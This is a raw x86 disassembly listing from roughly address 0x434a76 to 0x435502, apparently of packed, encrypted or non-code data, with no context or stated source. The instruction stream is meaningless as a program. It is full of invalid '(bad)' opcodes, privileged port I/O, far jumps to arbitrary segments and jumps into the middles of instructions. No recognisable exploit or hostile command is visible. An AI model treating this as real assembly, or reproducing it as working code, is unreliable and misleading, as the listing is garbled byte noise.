  434a76:	inc    BYTE PTR [edx-0x7caba205]
  434a7c:	repnz push ebp
  434a7e:	pop    eax
  434a7f:	mov    dh,0xfa
  434a81:	sbb    eax,0xced017e4
  434a86:	sbb    al,0x5
  434a88:	test   DWORD PTR [edi-0x2eace65e],edi
  434a8e:	mov    DWORD PTR [ebx+edi*8],0x52495fb6
  434a95:	push   ss
  434a96:	pop    esi
  434a97:	xor    DWORD PTR [ebp+ecx*8+0x22],0xc57c81
	...
  434abb:	add    BYTE PTR [esi],bl
  434abd:	or     DWORD PTR [ebp+ecx*8-0xa],0xbc30a416
  434ac5:	test   eax,0x7d0ef5bd
  434aca:	leave  
  434acb:	cmc    
  434acc:	cli    
  434acd:	mov    cl,0x86
  434acf:	std    
  434ad0:	repnz dec DWORD PTR [ebp+eiz*8-0x4e122120]
  434ad8:	xchg   edi,eax
  434ad9:	jge    0x434aef
  434adb:	out    0x56,eax
  434add:	lock je 0x434b3e
  434ae0:	jg     0x434b27
  434ae2:	add    al,0xe9
  434ae4:	test   BYTE PTR [edx],cl
  434ae6:	je     0x434af5
  434ae8:	or     eax,0x1c3e6818
  434aed:	or     eax,DWORD PTR [edi+0x74129239]
  434af3:	(bad)  
  434af5:	mov    esp,DWORD PTR [ebx]
  434af7:	cmc    
  434af8:	std    
  434af9:	mov    esp,DWORD PTR [ebx]
  434afb:	in     eax,dx
  434afc:	push   esp
  434afd:	or     dl,BYTE PTR ds:0xffc784a5
  434b03:	imul   edx,ebp,0x2a0086f3
  434b09:	push   edx
  434b0a:	mov    ebp,0x6846408
  434b0f:	push   esi
  434b10:	out    dx,eax
  434b11:	jmp    0x434b0d
  434b13:	retf   0x900c
  434b16:	cmc    
  434b17:	push   DWORD PTR [ebx+0x7f]
  434b1a:	shl    BYTE PTR [ebp+ecx*1-0x7b],0x2d
  434b1f:	add    eax,DWORD PTR [eax]
	...
  434b3d:	add    BYTE PTR [ebx],ch
  434b3f:	dec    ebp
  434b40:	div    BYTE PTR [eax+ecx*1+0x0]
  434b44:	dec    esi
  434b45:	call   FWORD PTR [ecx+0x47]
  434b48:	adc    DWORD PTR [eax+0x24],eax
  434b4b:	jl     0x434b11
  434b4d:	or     al,0x35
  434b4f:	adc    BYTE PTR [edx+0x2afd4fc6],al
  434b55:	rcl    dl,0xbd
  434b58:	add    eax,DWORD PTR [eax]
  434b5a:	fimul  DWORD PTR [eax+0x2a]
  434b5d:	(bad)  
  434b5e:	fnsave [esi+0x1f]
  434b61:	or     al,0x1a
  434b63:	jb     0x82362b5a
  434b69:	or     al,0xea
  434b6b:	test   BYTE PTR [edi],cl
  434b6d:	cmp    ch,BYTE PTR [esi+0x3447066d]
  434b73:	xor    eax,0x6ce02477
  434b78:	out    0x33,al
  434b7a:	and    al,0x50
  434b7c:	pop    ecx
  434b7d:	ret    0x2b8
  434b80:	pop    es
  434b81:	mov    dh,0x6
  434b83:	add    BYTE PTR [esi-0x1d41e03f],ch
  434b89:	icebp  
  434b8a:	rep outs dx,BYTE PTR ds:[esi]
  434b8c:	pop    ds
  434b8d:	or     dh,cl
  434b8f:	add    dh,bh
  434b91:	je     0x434b9b
  434b93:	add    bh,dh
  434b95:	adc    eax,0x3b0854
  434b9a:	daa    
  434b9b:	mov    edi,0x210dc20b
  434ba0:	call   DWORD PTR [ecx+0x0]
	...
  434bbf:	add    dl,bl
  434bc1:	das    
  434bc2:	stos   DWORD PTR es:[edi],eax
  434bc3:	and    ecx,DWORD PTR [ecx]
  434bc5:	mov    esp,ebx
  434bc7:	sub    cl,dl
  434bc9:	cmp    al,0xfb
  434bcb:	cs push 0xffffffa1
  434bce:	push   cs
  434bcf:	dec    edi
  434bd0:	bound  ecx,QWORD PTR [edx+eiz*8-0x6e23ced]
  434bd7:	push   edi
  434bd8:	sti    
  434bd9:	fadd   DWORD PTR [ebx]
  434bdb:	jg     0x434c2e
  434bdd:	sbb    al,0x88
  434bdf:	sar    BYTE PTR [ecx-0x9be3ddb],0xbc
  434be6:	out    0xb,eax
  434be8:	mov    ebx,0xcabfcf3b
  434bed:	out    dx,al
  434bee:	cmp    eax,0x41a20d08
  434bf3:	out    0x22,eax
  434bf5:	pop    ds
  434bf6:	ret    
  434bf7:	and    ecx,DWORD PTR [ecx]
  434bf9:	jmp    0x73f2:0xe6d536e6
  434c00:	sbb    al,0x42
  434c02:	inc    esp
  434c03:	push   eax
  434c04:	pop    esp
  434c05:	jle    0x434b9f
  434c07:	and    eax,DWORD PTR [ecx]
  434c09:	xchg   al,bh
  434c0b:	dec    ebx
  434c0c:	add    edx,edi
  434c0e:	add    edi,DWORD PTR [edi-0x37]
  434c11:	and    ecx,DWORD PTR [edi+0x1]
  434c14:	out    0x19,al
  434c16:	sar    DWORD PTR [edi+0x54ff1bcf],1
  434c1c:	xchg   esi,eax
  434c1d:	mov    ebx,0x9c65ec7e
  434c22:	inc    ebx
  434c23:	or     eax,DWORD PTR [eax]
	...
  434c41:	add    BYTE PTR [ecx+0xd0003cb],dl
  434c47:	pushf  
  434c48:	adc    DWORD PTR [ebx],ecx
  434c4a:	xchg   ecx,eax
  434c4b:	rol    DWORD PTR [ebx],cl
  434c4d:	add    BYTE PTR ds:0x3f44cb98,cl
  434c53:	add    BYTE PTR [esi+0x6bea1eb3],ah
  434c59:	shl    DWORD PTR [esi-0x6ffc8151],0xb3
  434c60:	xor    BYTE PTR [ebp+0xde1de72],dh
  434c66:	jbe    0x434ce3
  434c68:	sub    DWORD PTR [ecx+0x1cf49a0f],ebx
  434c6e:	test   eax,0xda03e900
  434c73:	or     dl,dh
  434c75:	dec    BYTE PTR [edi+0xd03e96b]
  434c7b:	add    eax,0x8107710d
  434c80:	daa    
  434c81:	add    al,0x92
  434c83:	shl    al,0xe8
  434c86:	mov    bh,0x89
  434c88:	mov    esp,0x5d8633e2
  434c8d:	ret    
  434c8e:	push   cs
  434c8f:	sbb    DWORD PTR [eax],esi
  434c91:	sub    edi,0xffffffff
  434c94:	lea    edx,[ebp-0xbd6b2f9]
  434c9a:	repz xchg ebp,eax
  434c9c:	loope  0x434cf4
  434c9e:	dec    ebp
  434c9f:	bnd jge 0x434c3d
  434ca2:	pop    es
  434ca3:	dec    ebp
  434ca4:	xor    DWORD PTR [eax],eax
	...
  434cc2:	add    BYTE PTR [eax],al
  434cc4:	(bad)  
  434cc5:	ds out 0x97,eax
  434cc8:	or     al,0xf5
  434cca:	cmp    ebx,eax
  434ccc:	(bad)  
  434ccd:	sbb    BYTE PTR [eax],dl
  434ccf:	jnp    0x434c9d
  434cd1:	ds push ecx
  434cd3:	add    dl,BYTE PTR [edx+0x38]
  434cd6:	pop    ebx
  434cd7:	sbb    dl,BYTE PTR [esi-0x7f]
  434cda:	jecxz  0x434cea
  434cdc:	stos   BYTE PTR es:[edi],al
  434cdd:	mov    bl,0x52
  434cdf:	ret    
  434ce0:	push   es
  434ce1:	cld    
  434ce2:	mov    esp,0xa94d0605
  434ce7:	cmc    
  434ce8:	mov    bl,0xc5
  434cea:	jmp    FWORD PTR [ecx-0x1a]
  434ced:	or     bh,ah
  434cef:	lock fwait
  434cf1:	push   ecx
  434cf2:	inc    eax
  434cf3:	add    esi,esi
  434cf5:	aam    0xa
  434cf7:	push   esi
  434cf8:	dec    esi
  434cf9:	call   0x51c711e4
  434cfe:	dec    eax
  434cff:	icebp  
  434d00:	(bad)  
  434d03:	not    DWORD PTR [edi]
  434d05:	fcmovnb st,st(2)
  434d07:	out    0x36,eax
  434d09:	call   0x360a:0xe307e93f
  434d10:	dec    esi
  434d11:	clc    
  434d12:	repnz mov ecx,0x960aeff4
  434d18:	push   ecx
  434d19:	clc    
  434d1a:	rol    cl,0x15
  434d1d:	sbb    eax,0xbfe1de03
  434d22:	or     ebp,DWORD PTR [eax-0x368104ef]
	...
  434d44:	add    BYTE PTR [eax],al
  434d46:	push   cs
  434d47:	ja     0x434d4b
  434d49:	cli    
  434d4a:	into   
  434d4b:	ss mov edi,0xfe1d0a43
  434d51:	adc    al,BYTE PTR [ebx]
  434d53:	test   al,0xc8
  434d55:	stos   BYTE PTR es:[edi],al
  434d56:	sbb    DWORD PTR [esi+0x7e],0x7e50092b
  434d5d:	sub    edx,DWORD PTR [ecx]
  434d5f:	dec    edx
  434d60:	jle    0x434d8d
  434d62:	or     DWORD PTR [eax+0x7e],eax
  434d65:	sub    edx,DWORD PTR [ecx]
  434d67:	ds jle 0x434d95
  434d6a:	or     DWORD PTR [ebp+0x7e],ecx
  434d6d:	sub    edx,DWORD PTR [ecx]
  434d6f:	sbb    al,0x7e
  434d71:	stos   DWORD PTR es:[edi],eax
  434d72:	push   cs
  434d73:	or     eax,0xb0eab7e
  434d78:	jle    0x434d25
  434d7a:	push   cs
  434d7b:	add    DWORD PTR [edi-0x55],edi
  434d7e:	push   cs
  434d7f:	dec    ebp
  434d80:	jle    0x434d82
  434d82:	inc    WORD PTR [edx]
  434d85:	xor    DWORD PTR [esi-0x1],0xa
  434d89:	xor    DWORD PTR [esi-0x1],0x12
  434d8d:	and    DWORD PTR [esi-0x1],0x23
  434d91:	and    DWORD PTR [esi-0x1],0xffffffd6
  434d95:	xor    BYTE PTR [esi+0x88b54ff],0x7f
  434d9c:	in     al,dx
  434d9d:	adc    al,0x66
  434d9f:	(bad)  
  434da0:	inc    DWORD PTR [edx+0x53f6f7b9]
  434da6:	xor    BYTE PTR [ecx],0xd2
  434da9:	push   0x0
	...
  434dc7:	add    BYTE PTR [eax-0x7e],dh
  434dca:	test   ah,ch
  434dcc:	imul   esi,esp,0x6a6b50f6
  434dd2:	add    ebp,DWORD PTR [edx+0x32]
  434dd5:	push   edi
  434dd6:	jecxz  0x434ddd
  434dd8:	mov    dl,0xf3
  434dda:	test   BYTE PTR [ebp-0x31d4f],0x4b
  434de1:	dec    edi
  434de2:	div    BYTE PTR [ebp+0x38]
  434de5:	hlt    
  434de6:	je     0x434e00
  434de8:	dec    esp
  434de9:	cli    
  434dea:	jmp    FWORD PTR ss:[ebx-0x78]
  434dee:	out    dx,eax
  434def:	test   DWORD PTR [edx+0x6b],esi
  434df2:	cmp    al,BYTE PTR [ebx+0x73fb0c29]
  434df8:	add    al,0xf4
  434dfa:	je     0x434e0c
  434dfc:	mov    ebp,DWORD PTR [ecx+0x13]
  434dff:	call   ecx
  434e01:	jb     0x434e0d
  434e03:	inc    eax
  434e04:	hlt    
  434e05:	jns    0x434dc7
  434e07:	je     0x434da9
  434e09:	repz je 0x434e20
  434e0c:	cmp    DWORD PTR [edx],edi
  434e0e:	repz push 0xffffffe5
  434e11:	push   0xfeb467fb
  434e16:	(bad)  
  434e17:	mov    edi,0x1791aa0d
  434e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434e1d:	mov    gs,WORD PTR [ecx-0x6]
  434e20:	mov    dl,0x94
  434e22:	ds jne 0x434e2b
  434e25:	ret    0xbf1
  434e28:	(bad)  
  434e29:	pop    eax
  434e2a:	(bad)  
  434e2b:	jle    0x434e2d
	...
  434e49:	add    BYTE PTR [ebp-0x2ffd6c98],dl
  434e4f:	mov    eax,ds:0x6c0dfffe
  434e54:	add    al,0xfa
  434e56:	dec    esi
  434e57:	cwde   
  434e58:	pop    es
  434e59:	call   FWORD PTR fs:[esi+0x5380f1cf]
  434e60:	pop    es
  434e61:	call   0xfb4ff253
  434e66:	xchg   esi,eax
  434e67:	shr    BYTE PTR [esi+edx*2-0xd29bc],cl
  434e6e:	mov    ecx,0xdc51178d
  434e73:	scas   al,BYTE PTR es:[edi]
  434e74:	add    edi,DWORD PTR [eax-0x3113e]
  434e7a:	xor    al,BYTE PTR [eax+eax*4]
  434e7d:	sti    
  434e7e:	xor    bh,BYTE PTR [edi+0x1c]
  434e81:	jmp    FWORD PTR [edx]
  434e83:	sbb    BYTE PTR [edx-0x2f],bh
  434e86:	sbb    dh,BYTE PTR [esi]
  434e88:	jge    0x434ecf
  434e8a:	adc    eax,0x4c8703be
  434e8f:	(bad)  
  434e90:	mov    al,0xfb
  434e92:	cmc    
  434e93:	or     eax,DWORD PTR [eax+0x3c2702fb]
  434e99:	call   DWORD PTR [ecx+0x6f]
  434e9c:	call   0xfd68:0x7cc1fff
  434ea3:	cmp    edi,edi
  434ea5:	(bad)  
  434ea6:	cmp    al,0xe7
  434ea8:	sbb    esi,esi
  434eaa:	jmp    0x434ec3
  434eac:	(bad)  
  434ead:	inc    BYTE PTR [eax]
	...
  434ecb:	add    BYTE PTR [ebx],cl
  434ecd:	add    dh,dh
  434ecf:	mov    dl,0xe
  434ed1:	ja     0x434eb6
  434ed3:	jl     0x434f34
  434ed5:	cld    
  434ed6:	pop    ds
  434ed7:	inc    edi
  434ed8:	xchg   edx,eax
  434ed9:	mov    esp,0xbbfbf404
  434ede:	or     al,0xfc
  434ee0:	pop    ds
  434ee1:	out    dx,eax
  434ee2:	mov    dh,0xfd
  434ee4:	mov    edi,DWORD PTR [esp+ecx*1+0x4bbe3f8]
  434eeb:	add    BYTE PTR [esi],bl
  434eed:	sti    
  434eee:	aad    0x43
  434ef0:	int    0x14
  434ef2:	out    0xd6,eax
  434ef4:	ret    0xf93e
  434ef7:	add    esp,eax
  434ef9:	je     0x434ef8
  434efb:	xchg   BYTE PTR [ecx-0x30],ah
  434efe:	xchg   ebp,eax
  434eff:	mov    cl,0xbf
  434f01:	jb     0x434ea7
  434f03:	das    
  434f04:	mov    ebp,0xbd1fac72
  434f09:	jb     0x434eaf
  434f0b:	pop    ss
  434f0c:	mov    ebp,0x99fc2c74
  434f11:	mov    ds:0x61171bbc,eax
  434f16:	ror    DWORD PTR [edx],cl
  434f18:	xchg   ecx,eax
  434f19:	inc    eax
  434f1a:	fidivr DWORD PTR [edi+0x30]
  434f1d:	add    cl,ch
  434f1f:	add    edx,DWORD PTR [edx+0x57eecbb]
  434f25:	jne    0x434f58
  434f27:	add    BYTE PTR [edx+0x5b165e39],dl
  434f2d:	add    BYTE PTR [ecx],ch
  434f2f:	and    BYTE PTR [eax],al
	...
  434f4d:	add    BYTE PTR ds:0xd006947,dh
  434f53:	add    al,dl
  434f55:	shr    dl,0x8d
  434f58:	out    dx,al
  434f59:	xchg   edx,eax
  434f5a:	or     edi,eax
  434f5c:	sti    
  434f5d:	pop    ss
  434f5e:	jnp    0x434f4d
  434f60:	jns    0x434ef2
  434f62:	repnz cld 
  434f64:	(bad)  
  434f65:	jp     0x434f6e
  434f67:	mov    ebp,ebx
  434f69:	fimul  DWORD PTR [ecx-0x50]
  434f6c:	push   ecx
  434f6d:	push   ecx
  434f6e:	lea    eax,[ebx+edi*8]
  434f71:	pop    esi
  434f72:	and    eax,DWORD PTR [edx]
  434f74:	xor    DWORD PTR [ecx],ebp
  434f76:	cmp    al,BYTE PTR [eax+0xb]
  434f79:	gs xor eax,0x2be90000
  434f7f:	cmp    eax,0xbbd13a87
  434f84:	out    0xbb,eax
  434f86:	test   al,0x8d
  434f88:	add    al,0xf0
  434f8a:	jge    0x434fa8
  434f8c:	outs   dx,BYTE PTR ds:[esi]
  434f8d:	cli    
  434f8e:	pop    ss
  434f8f:	mov    esp,edi
  434f91:	jmp    0x3f83:0xd750518
  434f98:	push   eax
  434f99:	mov    bh,0x16
  434f9b:	test   al,0xfa
  434f9d:	push   es
  434f9e:	pop    ss
  434f9f:	sbb    esi,edi
  434fa1:	mov    edx,0x7dc07bce
  434fa6:	jp     0x435021
  434fa8:	ret    
  434fa9:	(bad)  
  434faa:	sti    
  434fab:	mov    BYTE PTR [ecx+ecx*8-0x5d],0xea
  434fb0:	jb     0x434f96
	...
  434fce:	add    BYTE PTR [eax],al
  434fd0:	push   edi
  434fd1:	mov    ebx,ebx
  434fd3:	pop    ebx
  434fd4:	inc    eax
  434fd5:	add    eax,0x1208c975
  434fda:	sti    
  434fdb:	cmp    al,0xf5
  434fdd:	lock rcr BYTE PTR [ecx],0x5f
  434fe1:	sbb    BYTE PTR [ebx],ch
  434fe3:	mov    dh,0x4
  434fe5:	add    eax,0x4038ebe7
  434fea:	test   BYTE PTR [ecx-0x5978c963],ch
  434ff0:	sub    bh,0x38
  434ff3:	sub    al,0x29
  434ff5:	outs   dx,BYTE PTR ds:[esi]
  434ff6:	push   ss
  434ff7:	push   ss
  434ff8:	repnz cmp BYTE PTR [ebp+0x0],dh
  434ffc:	mov    BYTE PTR [esi+0x2bd9ff09],dl
  435002:	sti    
  435003:	icebp  
  435004:	arpl   WORD PTR [edi-0x4b5aec32],cx
  43500a:	push   eax
  43500b:	call   0x3a58ca
  435010:	pop    edi
  435011:	push   es
  435012:	sub    al,al
  435014:	sub    BYTE PTR [esp+esi*2+0x12],al
  435018:	das    
  435019:	mov    edi,0x8ff4850a
  43501e:	std    
  43501f:	sbb    BYTE PTR [eax+ecx*1+0x8a8487b],0xb0
  435027:	add    DWORD PTR [edi-0x2d],ecx
  43502a:	cmp    DWORD PTR [ebp-0x80],0x1cf47576
  435031:	jb     0x435029
  435033:	inc    DWORD PTR [eax]
	...
  435051:	add    BYTE PTR [ebx],ah
  435053:	test   DWORD PTR [eax+edx*1+0x64],edi
  435057:	(bad)  
  435058:	punpckhdq mm3,QWORD PTR [esp+edi*2-0x42]
  43505d:	push   eax
  43505e:	arpl   WORD PTR [esi-0x48c600f6],cx
  435064:	adc    BYTE PTR [eax+0x64],al
  435067:	test   bl,al
  435069:	or     al,0xbf
  43506b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43506c:	add    cl,BYTE PTR [ebp+0x50500fe9]
  435072:	hlt    
  435073:	mov    bl,0xe2
  435075:	sbb    al,0xa3
  435077:	or     bh,dh
  435079:	pop    edi
  43507a:	repnz lods al,BYTE PTR ds:[esi]
  43507c:	mov    edx,0x8b550330
  435082:	push   eax
  435083:	sub    bl,0x18
  435086:	add    eax,DWORD PTR es:[eax]
  435089:	push   ebx
  43508a:	dec    edx
  43508b:	mov    cl,0xf5
  43508d:	jne    0x43507f
  43508f:	jne    0x435016
  435091:	in     al,dx
  435092:	or     eax,0xf2fb0794
  435097:	adc    edi,esp
  435099:	dec    edi
  43509a:	cmc    
  43509b:	xchg   esi,eax
  43509c:	ret    0xe2fa
  43509f:	jno    0x4350b0
  4350a1:	test   ebx,esp
  4350a3:	in     eax,0x7a
  4350a5:	ret    
  4350a6:	or     eax,0x8e61fee9
  4350ab:	es add al,0xb
  4350ae:	mov    DWORD PTR [ebx+0x6a0dfffe],ebx
  4350b4:	mov    dl,0xb
	...
  4350d2:	add    BYTE PTR [eax],al
  4350d4:	mov    dl,0x19
  4350d6:	or     DWORD PTR [ebp-0x73124456],eax
  4350dc:	mov    BYTE PTR [edx+eax*1-0x5],cl
  4350e0:	call   0xbed9:0x8d150798
  4350e7:	call   DWORD PTR [ecx-0x3afb74d8]
  4350ed:	call   0xb95350f0
  4350f2:	pushf  
  4350f3:	(bad)  
  4350f4:	in     al,0xe5
  4350f6:	xchg   esi,eax
  4350f7:	jmp    FWORD PTR [edx-0x18]
  4350fa:	mov    esi,0x20c888c
  4350ff:	sti    
  435100:	pop    edx
  435101:	cwde   
  435102:	jno    0x435149
  435104:	add    DWORD PTR [ecx],eax
  435106:	xchg   esi,eax
  435107:	xchg   esi,eax
  435108:	dec    ebx
  435109:	in     eax,0x7f
  43510b:	sar    BYTE PTR [ecx+0x41457960],0x38
  435112:	cmp    ebx,0x7501fdb8
  435118:	std    
  435119:	jae    0x4350dc
  43511b:	or     edi,DWORD PTR [ebp+0x1af9b4d0]
  435121:	mov    ch,0x7f
  435123:	rcr    BYTE PTR [ecx+0x17d7f48],0x1
  43512a:	mov    ds:0x1b812b91,al
  43512f:	or     al,0xf6
  435131:	jae    0x4350ff
  435133:	scas   al,BYTE PTR es:[edi]
  435134:	pop    edi
  435135:	mov    esp,DWORD PTR [ebx]
  435137:	adc    BYTE PTR [eax],al
	...
  435155:	add    BYTE PTR ds:0xe7f7fbfd,bh
  43515b:	adc    edi,DWORD PTR [ecx+0x6c001af1]
  435161:	inc    esp
  435162:	jmp    0xb950:0xbec15c10
  435169:	mov    bl,0x91
  43516b:	pop    ebx
  43516c:	in     eax,dx
  43516d:	sbb    ebp,DWORD PTR [esi+ebx*4]
  435170:	push   edx
  435171:	pop    es
  435172:	mov    eax,eax
  435174:	aam    0xd6
  435176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435177:	jae    0x43516e
  435179:	push   es
  43517a:	clc    
  43517b:	add    edx,esi
  43517d:	ret    
  43517e:	call   0xa256:0x97f7a382
  435185:	push   es
  435186:	and    ah,al
  435188:	cmc    
  435189:	ret    
  43518a:	add    BYTE PTR [eax+ebp*1+0x66661090],0xc6
  435192:	jb     0x4351a2
  435194:	fs test eax,0x7901fd67
  43519a:	enter  0x110b,0x26
  43519e:	cmp    esi,0xfffffff1
  4351a1:	push   ebx
  4351a2:	or     al,0xe9
  4351a4:	fidivr WORD PTR [eax-0x30]
  4351a7:	or     edx,ecx
  4351a9:	xor    DWORD PTR [ebx+0x7ad1d9fe],ebx
  4351af:	pop    ebp
  4351b0:	xor    ebp,DWORD PTR [ebx+0x3dcc245]
  4351b6:	cli    
  4351b7:	mov    edi,0xd84e
	...
  4351d8:	rol    BYTE PTR [esi+0x4685fc22],cl
  4351de:	add    ch,ah
  4351e0:	xchg   ecx,eax
  4351e1:	inc    ecx
  4351e2:	adc    BYTE PTR [eax+ecx*8+0xe],bl
  4351e6:	das    
  4351e7:	mov    al,0xbe
  4351e9:	rol    DWORD PTR [ecx-0x1b],0x11
  4351ed:	add    BYTE PTR [eax],al
  4351ef:	jmp    0x632b5427
  4351f4:	into   
  4351f5:	cld    
  4351f6:	fs jo  0x435191
  4351f9:	adc    bl,bh
  4351fb:	aam    0x9e
  4351fd:	push   cs
  4351fe:	inc    eax
  4351ff:	jmp    0x624f1593
  435204:	or     BYTE PTR [ebp-0x17e68daf],bh
  43520a:	push   cs
  43520b:	jmp    0xae35521e
  435210:	rol    BYTE PTR [ecx+eax*1],cl
  435213:	aad    0xa8
  435215:	dec    esi
  435216:	call   0xfb3c670d
  43521b:	jb     0x4351f5
  43521d:	pop    ecx
  43521e:	mov    esi,0x41850eed
  435223:	loope  0x435270
  435225:	add    ch,al
  435227:	jb     0x435277
  435229:	cld    
  43522a:	sub    DWORD PTR [ecx],0xffffff8a
  43522d:	add    DWORD PTR [eax+0x16],edx
  435230:	jge    0x435232
  435232:	pop    gs
  435234:	push   cs
  435235:	stc    
  435236:	jno    0x435211
  435238:	push   es
  435239:	out    0xf8,eax
  43523b:	inc    BYTE PTR [eax]
	...
  435259:	add    BYTE PTR [eax],dl
  43525b:	rol    DWORD PTR [ecx],0x91
  43525e:	cmp    DWORD PTR [eax+eax*1],0x2a
  435262:	(bad)  
  435263:	jns    0x43526d
  435265:	jmp    0xe9a960fd
  43526a:	xchg   esp,eax
  43526b:	cld    
  43526c:	push   0xf9fc94e8
  435271:	hlt    
  435272:	pop    edx
  435273:	cmovo  eax,DWORD PTR [eax]
  435276:	xor    al,0x79
  435278:	or     BYTE PTR ds:[ecx+0x67017543],dh
  43527f:	into   
  435280:	mov    edx,0xadf5b740
  435285:	inc    ecx
  435286:	add    BYTE PTR [ecx+0x1232cf7],al
  43528c:	sub    eax,eax
  43528e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43528f:	cmc    
  435290:	mov    al,0x49
  435292:	fadd   QWORD PTR [eax+0x3ebfd4bf]
  435298:	mov    ebx,0x7b185f55
  43529d:	in     al,dx
  43529e:	les    ebp,FWORD PTR [ebp-0x2ec374b3]
  4352a4:	mov    edx,0xde8b3940
  4352a9:	call   0x3e2d2e
  4352ae:	dec    esp
  4352af:	outs   dx,DWORD PTR ds:[esi]
  4352b0:	cmp    edi,0xfc45775b
  4352b6:	sbb    DWORD PTR [ebx-0x1524af16],edi
  4352bc:	push   edx
  4352bd:	adc    DWORD PTR [eax],eax
	...
  4352db:	add    BYTE PTR [edi+edi*8-0x7c],ah
  4352df:	rol    cl,0xf3
  4352e2:	pop    ds
  4352e3:	inc    ebp
  4352e4:	and    BYTE PTR ds:0xbf771815,al
  4352ea:	cli    
  4352eb:	mov    BYTE PTR [ecx+0xc14620f],ah
  4352f1:	mov    esp,0xaf74001c
  4352f6:	mov    eax,DWORD PTR [ebp+0x10]
  4352f9:	sbb    al,0x97
  4352fb:	and    eax,0xc083ff64
  435300:	ror    dh,0x64
  435303:	or     BYTE PTR [ecx-0x56af1547],bh
  435309:	mov    ecx,0x640de8de
  43530e:	(bad)  
  435310:	sub    ah,BYTE PTR [ebp+0x3f]
  435313:	je     0x435318
  435315:	dec    edi
  435316:	add    BYTE PTR [ebp-0x73514330],cl
  43531c:	enter  0x16cc,0x77
  435320:	xor    cl,ch
  435322:	inc    BYTE PTR [ebx-0x7307e333]
  435328:	push   eax
  435329:	test   DWORD PTR [esi],edx
  43532b:	adc    DWORD PTR [ebx],ebp
  43532d:	jmp    0x1410d730
  435332:	loop   0x435399
  435334:	stc    
  435335:	push   cs
  435336:	add    al,0x53
  435338:	fcmovbe st,st(3)
  43533a:	scas   al,BYTE PTR es:[edi]
  43533b:	adc    DWORD PTR [ebp-0x17],ecx
  43533e:	cwde   
  43533f:	pop    es
	...
  43535c:	add    BYTE PTR [eax],al
  43535e:	cwde   
  43535f:	and    edx,DWORD PTR [eax+edx*2]
  435362:	mov    gs,WORD PTR [ecx]
  435364:	repz push edx
  435366:	mov    edx,0x4d11b2f3
  43536b:	jmp    0x5c4917ef
  435370:	mov    edx,0xd9e4b5e3
  435375:	call   FWORD PTR [edx-0x31375b67]
  43537b:	call   0x8002:0x407d86ab
  435382:	and    BYTE PTR [ecx],0xf4
  435385:	mov    cl,0x4d
  435387:	jg     0x4353cc
  435389:	sti    
  43538a:	or     eax,0x5a86fee9
  43538f:	adc    DWORD PTR [esi],eax
  435391:	cli    
  435392:	dec    edi
  435393:	jo     0x435382
  435395:	out    0x72,eax
  435397:	push   0x3b02fb04
  43539c:	aas    
  43539d:	cdq    
  43539e:	inc    edx
  43539f:	jmp    0x2c981b
  4353a4:	hlt    
  4353a5:	mov    ?,ecx
  4353a7:	dec    ebx
  4353a8:	repz inc ebx
  4353aa:	or     eax,0x93062a88
  4353af:	inc    ebx
  4353b0:	add    eax,0xe6419514
  4353b5:	nop
  4353b6:	int3   
  4353b7:	add    edi,DWORD PTR [ebx+0xd7b93c6]
  4353bd:	sbb    BYTE PTR ds:0x51288,cl
	...
  4353df:	add    BYTE PTR [ecx+0xa],bh
  4353e2:	(bad)  
  4353e4:	div    BYTE PTR [ebp+eax*8+0x1b]
  4353e8:	pop    ebp
  4353e9:	stc    
  4353ea:	mov    ecx,0x7e0cce87
  4353ef:	or     ebp,esi
  4353f1:	add    BYTE PTR [edx-0x2a9929fd],al
  4353f7:	jmp    0x435450
  4353f9:	pop    ds
  4353fa:	jmp    0xa2c0b102
  4353ff:	sbb    al,0x5f
  435401:	stc    
  435402:	cmp    DWORD PTR [edi+0x61ba0cce],eax
  435408:	jae    0x435416
  43540a:	jmp    0x682fe667
  43540f:	lock outs dx,BYTE PTR ds:[esi]
  435411:	(bad)  
  435412:	call   0x1dc6931a
  435417:	js     0x435462
  435419:	bound  esp,QWORD PTR [esi+0x3f]
  43541c:	or     eax,0xb990eb74
  435421:	pusha  
  435422:	and    al,0x3
  435424:	jbe    0x43540e
  435426:	and    eax,DWORD PTR [edx+0x6965f976]
  43542c:	popa   
  43542d:	add    BYTE PTR [esi+0x69],ah
  435430:	popa   
  435431:	add    BYTE PTR [esi-0x670c2e70],dl
  435437:	jmp    0x435457
  435439:	xor    eax,0x840ee900
  43543e:	mov    edi,0x74f52575
  435443:	in     eax,0x0
	...
  435461:	add    BYTE PTR [ebx+0x3554fabf],cl
  435467:	arpl   WORD PTR [eax],ax
  435469:	cmp    DWORD PTR [ecx+0xee8ffcb],edi
  43546f:	call   0x548dd0
  435474:	sti    
  435475:	xor    al,0x15
  435477:	loope  0x4354bc
  435479:	mov    cl,0xf
  43547b:	cmc    
  43547c:	dec    esi
  43547d:	ror    DWORD PTR [eax+edi*8-0x6],0xa6
  435482:	ins    BYTE PTR es:[edi],dx
  435483:	(bad)  
  435484:	mov    esi,0x7ee48234
  435489:	(bad)  
  43548a:	out    0x7f,al
  43548c:	jmp    0x435433
  43548e:	adc    eax,0x371a0000
  435493:	dec    ebp
  435494:	lea    esp,ds:0x7f2f1425
  43549a:	pop    esi
  43549b:	xchg   DWORD PTR [ebx-0x3b],esi
  43549e:	es call 0xf552635c
  4354a4:	sub    DWORD PTR [ecx],0x1f
  4354a7:	test   BYTE PTR [ebp-0x17fff117],dl
  4354ad:	(bad)  
  4354ae:	repz cmc 
  4354b0:	cli    
  4354b1:	jb     0x435469
  4354b3:	xchg   DWORD PTR [ebx+0x5],ebx
  4354b6:	icebp  
  4354b7:	xchg   BYTE PTR [ebx+0xd],bl
  4354ba:	and    esi,ebp
  4354bc:	mov    esi,0xe81205d9
  4354c1:	in     eax,0xd3
  4354c3:	hlt    
  4354c4:	cli    
  4354c5:	mov    bh,0x0
	...
  4354e3:	add    BYTE PTR [ebx],bh
  4354e5:	rcl    DWORD PTR [ecx-0x56],1
  4354e8:	jbe    0x435545
  4354ea:	ds push cs
  4354ec:	vmwrite ecx,DWORD PTR [eax+eax*1+0x48]
  4354f1:	adc    al,0x10
  4354f3:	mov    esi,DWORD PTR [eax+0x20]
  4354f6:	sbb    bl,ch
  4354f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4354f9:	idiv   BYTE PTR [ecx-0x17ee46ff]
  4354ff:	scas   al,BYTE PTR es:[edi]
  435500:	push   ss
  435501:	(bad)  
  435502:	test   BYTE PTR [ebp-0x17dfd830],0xa1
